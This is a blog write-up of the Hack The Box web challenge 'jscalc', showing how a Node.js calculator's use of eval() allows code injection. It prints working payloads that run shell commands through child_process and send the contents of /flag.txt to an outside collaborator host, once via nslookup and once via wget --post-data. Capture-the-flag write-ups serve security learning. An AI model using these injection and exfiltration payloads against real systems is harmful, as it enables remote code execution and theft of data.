---
layout: post
title: jscalc HTB
date: 2024-03-09 18:11 -0500
img_path: /assets/img/jscale/
published: true
categories: ["Hack The Box","Web Challenge"]
tags: ["RCE", "NodeJs"]
toc: true
---
# jscalc

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑

This challenge is very straigth forward, we see on the main page that they use ```eval()```
![WebPage](image.png)
## Source Code Review
Let check the flow on our input in the calculator function.
First modify package.json, Dockerfile and the build-docker.sh to attach our debugger form VSCode. The /routes files define the endpoint /api/calculate, our **formula** parameter pass to Calculator.calculate() function.
![formula](image-1.png)
```javascript
router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})
```
the function is pretty simple
```javascript
    calculate(formula) {
        try {
            return eval(`(function() { return ${formula} ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
```
So if we can break the syntax, we shoul be able to get RCE, something like ```123;}())+console.log(1)//```
## Local Testing
We put a breakpoint on the return eval() line and pass our inpunt via BurpSuite
![RCE](image-2.png)
We are able to execute commands on the system. What command are able inside that docker container, after some test the approach i found was nslookup to exfiltrate flag.
```javascript
require('child_process').execSync('cat /flag.txt | base64 | xargs -I {} nslookup {}.burp.oastify.com')
```

![Poc](image-3.png)

![alt text](image-4.png)

## Proof of concept 
![GG](image-5.png)

That doesn't work for the challenge server so i have to change my payload to 
```json
{"formula":"123;}())+require('child_process').execSync('wget --post-data=$(cat /flag.txt) http://burp.oastify.com/ -O /dev/null')//"}
```